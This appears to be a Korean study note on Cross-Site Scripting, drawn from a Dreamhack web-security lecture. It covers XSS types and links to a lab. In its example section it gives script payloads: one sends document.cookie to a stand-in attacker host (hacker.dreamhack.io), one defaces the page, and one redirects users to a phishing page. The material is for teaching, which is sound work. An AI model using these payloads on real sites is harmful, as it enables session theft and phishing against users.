## 들어가며
클라이언트 사이트 취약점이란, 웹 페이지의 사용자를 대상으로 공격할 수 있는 취약점을 말한다. 해당 종류의 취약점을 통해 사용자를 식별하기 위한 세션 및 쿠키 정보를 탈취하고 해당 계정으로 임의의 기능을 수행할 수 있다. 이때, 임의의 기능이란 관리자 계정을 탈취해 관리자 행세를 하는 것이나, 워게임 문제에서 플래그를 획득하는 것 등의 행위를 말한다. 

이번 강의에서는 클라이언트 사이드 취약점의 대표적인 예시인 **Cross-Site Scripting(XSS)** 의 종류와 그 취약점이 어떠한 상황에서 발생할 수 있는지, 해당 공격이 어떻게 활용되는지 등을 공격 스크립트 예시와 함께 알아본다. 

---
## Cross-Site Scripting (XSS)
XSS는 클라이언트 사이드 취약점 중 하나로, <u>공격자가 웹 리소스에 악성 스크립트를 삽입해 사용자의 웹 브라우저에서 해당 스크립트를 실행</u>하는 방식으로 사용할 수 있다. 

예를 들어, 드림핵 웹 페이지에서 XSS 취약점이 존재하면 https://dreamhack.io 내에서 오리진 권한으로 악성 스크립트를 삽입한다. 이후 사용자가 해당 페이지를 방문하면 공격자가 삽입해 놓은 스크립트가 실행되어 쿠키 및 세션이 탈취될 수 있다. 

![[Pasted image 20260125014758.png]]

해당 취약점은 SOP 보안 정책이 등장하면서 서로 다른 오리진에서는 정보를 읽는 행위가 이전에 비해 힘들어졌으나, 이를 우회할 수 있는 다양한 기술이 등장하며 XSS 공격은 계속되고 있다. 

---
### XSS 발생 예시와 종류
XSS 공격은 기본적으로 사용자가 삽입한 내용을 출력하는 기능에서 발생하는데, 이런 기능의 예시로는 로그인 시 출력되는 "안녕하세요, 회원님"과 같은 문구 또는 게시물, 댓글 등이 있다. 

클라이언트는 HTTP 형식으로 웹 서버에 리소스를 요청하고 서버로부터 받은 응답, 즉 HTML, CSS, JS 등의 웹 리소스를 시각화해서 사용자에게 보여준다. 이때, HTML, CSS, JS와 같은 코드가 포함된 게시물을 조회할 경우 사용자는 변조된 페이지를 보거나 스크립트가 실행될 수 있다. 

XSS는 발생 형태에 따라 다양한 종류로 구분되는데, 아래에서 XSS 종류와 악성 스크립트가 삽입되는 위치를 확인할 수 있다. 

| 종류            | 설명                                                 |
| ------------- | -------------------------------------------------- |
| Stored XSS    | XSS에 사용되는 악성 스크립트가 서버에 저장되고, 서버의 응답에 담김            |
| Reflected XSS | XSS에 사용되는 악성 스크립트가 URL에 삽입되고, 서버의 응답에 담김           |
| DOM-based XSS | XSS에 사용되는 악성 스크립트가 URL fragment에 삽입                |
| Universal XSS | 클라이언트의 브라우저(또는 플러그인)에서 발생하는 취약점으로 SOP 정책을 우회하는 XSS |

---
### XSS 스크립트의 예시
**JavaScript**는 [[Background - Web & HTTPS]]에서 공부했던 것처럼 웹 문서의 동작을 정의한다. 이는 JavaScript를 자세히 검사하지 않는다면 사용자의 동의 없이 사용자의 권한으로 정보를 조회하거나 변경하는 등의 행위가 가능하다는 말도 된다. 

이런 행위가 가능한 이유는 사용자를 식별하기 위한 세션 및 쿠키가 웹 브라우저에 저장되어 있기 때문으로, 공격자는 JavaScript 코드를 통해 사용자에게 보여지는 웹 페이지를 조작하거나 웹 브라우저의 위치를 임의로 변경할 수 있다. 

JavaScript는 그 특성상 다양한 동작을 수행할 수 있어 XSS 공격에 주로 활용된다. 이때 JavaScript를 실행하기 위한 HTML 태그로는 `<script>`가 있으며, 닫는 태그가 존재한다. 

```html
<script>
// "hello" 문자열 alert 실행.
alert("hello");
// 현재 페이지의 쿠키(return type: string)
document.cookie; 
// 현재 페이지의 쿠키를 인자로 가진 alert 실행.
alert(document.cookie);
// 쿠키 생성(key: name, value: test)
document.cookie = "name=test;";
// new Image() 는 이미지를 생성하는 함수이며, src는 이미지의 주소를 지정. 공격자 주소는 http://hacker.dreamhack.io
// "http://hacker.dreamhack.io/?cookie=현재페이지의쿠키" 주소를 요청하기 때문에 공격자 주소로 현재 페이지의 쿠키 요청함
new Image().src = "http://hacker.dreamhack.io/?cookie=" + document.cookie;
</script>
```

위의 코드는 쿠키 및 세션을 탈취하기 위한 공격 코드이며, 아래의 코드는 사용자의 페이지 정보에 접근해 페이지 변조 공격을 수행하는 코드이다. 

```html
<script>
// 이용자의 페이지 정보에 접근.
document;
// 이용자의 페이지에 데이터를 삽입.
document.write("Hacked By DreamHack !");
</script>
```

아래 코드는 사용자의 위치를 임의로 변경하는 코드이다. 

```html
<script>
// 이용자의 위치를 변경.
// 피싱 공격 등으로 사용됨.
location.href = "http://hacker.dreamhack.io/phishing"; 
// 새 창 열기
window.open("http://hacker.dreamhack.io/")
</script>
```

---
## Basic XSS Lab
실습을 진행하기 전, 주로 발생하는 XSS의 종류에 대해 알아본다. 

**Stored XSS**
Stored XSS는 서버의 데이터베이스 또는 파일 등의 형태로 저장된 악성 스크립트를 조회할 때 발생하는 XSS로, 대표적으로 게시물과 댓글에 악성 스크립트를 포함해서 업로드하는 방식이 있다. 게시물은 불특정 다수에게 보여지기 때문에 해당 기능에서 XSS 취약점이 존재할 경우 높은 파급력을 가진다. 

**Reflected XSS**
Reflected XSS는 서버가 악성 스크립트가 담긴 요청을 출력할 때 발생하며, 대표적으로 게시판 서비스에서 작성된 게시글을 조회하기 위한 검색창에서 스크립트를 포함해 검색하는 방식이 있다. 사용자가 게시글을 검색하면 서버에서는 검색 결과를 사용자에게 반환하게 되는데, 일부 서비스에서는 검색 결과를 응답에 포함하며, 검색 문자열에 악성 스크립트가 포함되어 있을 때 Reflected XSS가 발생할 수 있다. 

---
### XSS Lab
지금까지 배운 내용을 Lab을 통해 학습한다. [이 링크](https://learn.dreamhack.io/labs/2ec6c228-ff7e-46f1-9196-da5f5bd5f1f4)를 눌러서 Lab 실습 환경을 열고 들어가면 된다. 

---
## 마치며
이번 강의에서는 XSS가 뭔지, 공격 방식은 어떻게 되는지 등을 공격 예시를 통해 해당 공격의 영향력을 알아보고 Lab에서 실습해보았다. 